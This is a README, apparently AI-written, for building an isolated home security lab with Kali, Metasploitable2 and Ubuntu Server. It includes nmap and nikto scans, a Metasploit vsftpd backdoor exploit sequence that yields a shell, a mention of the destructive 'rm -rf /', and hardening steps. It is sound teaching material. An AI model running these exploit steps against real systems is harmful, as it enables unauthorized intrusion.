# Cybersecurity Home Lab — README.md

> A simple, safe, step-by-step guide to build a local cybersecurity lab using VirtualBox, Kali Linux, Metasploitable2 and Ubuntu Server. Use this lab only for learning, testing, and defensive practice on machines you own or have permission to test.

---

## Table of Contents

1. [Project Overview](#project-overview)
2. [Safety & Legal Notice](#safety--legal-notice)
3. [Prerequisites](#prerequisites)
4. [Directory / Files in this repo](#directory--files-in-this-repo)
5. [Step 1 — Download & Prepare VMs (Foundation)](#step-1---download--prepare-vms-foundation)
6. [Step 2 — Configure the Isolated Lab Network](#step-2---configure-the-isolated-lab-network)
7. [Step 3 — Reconnaissance & Attack (Learning Exercises)](#step-3---reconnaissance--attack-learning-exercises)
8. [Step 4 — Defend and Harden (Ubuntu Server)](#step-4---defend-and-harden-ubuntu-server)
9. [Step 5 — Clean-up and Snapshotting](#step-5---clean-up-and-snapshotting)
10. [Troubleshooting Tips](#troubleshooting-tips)
11. [Extensions & Next Steps](#extensions--next-steps)
12. [References](#references)
13. [Contributing & License](#contributing--license)

---

## Project Overview

This repository contains a step-by-step README to create a small, **isolated** cybersecurity home lab to practise offensive and defensive techniques. The lab uses VirtualBox (or VMware), with three core VMs:

* **Kali Linux** — attacker machine with pentesting tools
* **Metasploitable2** — intentionally vulnerable target
* **Ubuntu Server** — defensive system to harden and protect

The goal is to safely learn reconnaissance, exploitation, and basic hardening.

---

## Safety & Legal Notice

**Important:** Only run attacks inside an isolated lab environment on machines you own or have explicit permission to test. Never target networks or systems you don't own. Misuse may be illegal and unethical.

Always isolate the lab (use an internal/host-only network) to prevent accidental harm to your home or corporate network.

---

## Prerequisites

* A modern desktop/laptop with at least 8GB RAM (16GB recommended) and sufficient disk (50GB+ free).
* Virtualization software: **Oracle VirtualBox** (free) or **VMware Workstation Player**.
* VM images or installers:

  * **Kali Linux** (64-bit) — installer or VirtualBox appliance.
  * **Metasploitable2** — Virtual appliance (`.vmdk` / `.ova`) or ISO.
  * **Ubuntu Server LTS** — latest LTS ISO.
* Basic familiarity with Linux terminal, networking, and VirtualBox UI.

---

## Directory / Files in this repo

```
README.md            # This file
/notes               # optional: place your notes, screenshots, scans here
/scripts             # optional: helper scripts (e.g., nmap quick scans)
```

---

## Step 1 — Download & Prepare VMs (Foundation)

1. Install VirtualBox or VMware.

2. Download the VM images:

   * Kali Linux: download installer or prebuilt VM from the official Kali site.
   * Metasploitable2: download the appliance (search "Metasploitable2 download").
   * Ubuntu Server LTS: get the latest LTS ISO from Ubuntu.

3. Create/import VMs in VirtualBox:

   * For Kali and Ubuntu, click **New** → choose a name, type `Linux`, version `Debian (64-bit)` for Kali or `Ubuntu (64-bit)` for Ubuntu.
   * Attach the downloaded ISO to the VM's optical drive and install normally.
   * For Metasploitable2, use **File → Import Appliance** and choose the `.ova` or attach the `.vmdk`.

4. Recommended resources per VM:

   * RAM: 2048–4096 MB (Kali/Ubuntu). Metasploitable2 can run on 1024–2048 MB.
   * Disk: 20 GB minimum.
   * CPUs: 1–2 cores each.

5. Optional — create snapshots after a clean install (useful to revert):

   * Right-click VM → Snapshots → Take Snapshot → name it `clean-install`.

---

## Step 2 — Configure the Isolated Lab Network

**Goal:** Ensure the lab is isolated from your host and the internet.

### VirtualBox (recommended) — Host-only / Internal network

1. In VirtualBox main window: **File → Host Network Manager**. Create a host-only network (e.g., `vboxnet0`) or rely on the default.
2. For each VM: **Settings → Network**:

   * Adapter 1: Set **Attached to** → `Internal Network` (or `Host-only Adapter`).
   * Name: use the same network name — e.g., `lab_network`.
   * Ensure **Cable connected** is checked.

> Note: `Internal Network` isolates VMs from host but keeps them visible to each other. `Host-only` also allows the host to reach VMs but no internet.

3. Start all VMs.
4. On each VM, find its IP address:

```bash
# On Kali or Ubuntu
ip a
# or
ifconfig
```

5. Test connectivity by pinging between machines:

```bash
ping <other-vm-ip>
```

If ping works both ways, your isolated network is ready.

---

## Step 3 — Reconnaissance & Attack (Learning Exercises)

> Run the following only inside your isolated lab.

### 3.1 Basic Reconnaissance with `nmap`

1. From Kali, run a quick TCP scan:

```bash
nmap -sS -sV -Pn <Metasploitable2_IP>
```

* `-sS` — stealth SYN scan
* `-sV` — service/version detection
* `-Pn` — skip host discovery (useful in isolated envs)

2. Inspect open ports and services. Note ports like 21 (FTP), 22 (SSH), 80 (HTTP), 445 (SMB), 3306 (MySQL), etc.

### 3.2 Exploitation with Metasploit

1. Start Metasploit on Kali:

```bash
sudo msfdb init    # only if the msf database isn't running yet
msfconsole
```

2. Search for a relevant exploit (example: vsftpd backdoor):

```text
msf > search vsftpd
msf > use exploit/unix/ftp/vsftpd_234_backdoor
msf exploit(exploit/unix/ftp/vsftpd_234_backdoor) > set RHOSTS <Metasploitable2_IP>
msf exploit(...) > exploit
```

3. If exploitation succeeds, you may drop into a shell. Practice responsibly: read the payload output and avoid destructive commands (don't run `rm -rf /`).

### 3.3 Practice Other Tools

* `nikto` for web scanning:

```bash
nikto -h http://<Metasploitable2_IP>
```

* `dirb` or `gobuster` for directory bruteforce on web services.
* `smbclient` and `enum4linux` for SMB enumeration.

---

## Step 4 — Defend and Harden (Ubuntu Server)

This section shows simple, practical hardening steps you can apply to the Ubuntu Server VM, then re-run attacks to observe the difference.

### 4.1 Update the system

```bash
sudo apt update && sudo apt -y upgrade
```

### 4.2 Create a non-root user (if not already):

```bash
sudo adduser student
sudo usermod -aG sudo student
```

### 4.3 Install and configure UFW (Uncomplicated Firewall)

```bash
sudo apt install ufw       # if needed
sudo ufw default deny incoming
sudo ufw default allow outgoing
sudo ufw allow ssh         # only if you need remote shell access
sudo ufw enable
sudo ufw status verbose
```

### 4.4 Secure SSH

Edit `/etc/ssh/sshd_config` to:

```
# sample changes
PermitRootLogin no
PasswordAuthentication yes   # consider using keys and set to no if using keys
# optionally change the SSH port from 22 to something else (security by obscurity)
```

Then restart sshd:

```bash
sudo systemctl restart sshd
```

### 4.5 Demonstrate the difference

1. From Kali, attempt the same exploit or nmap scan used earlier against the Ubuntu Server's IP.
2. You should observe:

   * Fewer open ports (UFW blocks them).
   * Exploits that previously worked on Metasploitable2 will fail on the hardened Ubuntu Server.

Document the before/after `nmap` outputs to show the effectiveness of your hardening.

---

## Step 5 — Clean-up and Snapshotting

* After experiments, revert to the `clean-install` snapshot if you want to reset the vulnerable machine.
* Export or archive VM snapshots if you plan to share the lab state.
* To safely remove the lab, power off the VMs and delete them from VirtualBox (File → Remove) and optionally delete associated virtual disks.

---

## Troubleshooting Tips

* If VMs cannot see each other: confirm all are on the same Internal/Host-only network, and that the adapters are enabled.
* If `msfconsole` database fails: run `sudo msfdb init` (or check `systemctl status postgresql`).
* If `nmap` shows `Host seems down`, try `-Pn` to skip ping discovery.

---

## Extensions & Next Steps

After you’re comfortable with the basic lab, consider:

* Adding more targets (old Windows VMs like Windows XP/7 for legacy testing).
* Deploying web apps with known vulnerabilities (OWASP Juice Shop) to practice web app security.
* Using network monitoring and IDS: install Suricata or Snort on a separate VM and generate traffic from Kali to observe alerts.
* Learn post-exploitation and privilege escalation on Linux with `linpeas`, `linuxprivchecker`.
* Implement centralized logging (ELK/EFK) to collect and analyze logs.

---

## References

* Kali Linux — official site
* Metasploitable2 — community project
* Ubuntu Server LTS — official site
* Metasploit Framework — Rapid7
* Nmap, Nikto, Gobuster — official tool pages

(Use official project pages when downloading images — avoid third-party, untrusted sources.)

---

## Contributing & License

Contributions are welcome. For small changes, open an issue or a PR with proposed edits to docs or scripts.

Suggested license: MIT — include a `LICENSE` file if you want to share this publicly.

---

## Contact / Notes

If you want this README turned into a downloadable `README.md` file in a particular format (shorter, more beginner-focused, or with screenshots and exact download links), say what you prefer and I will update it.
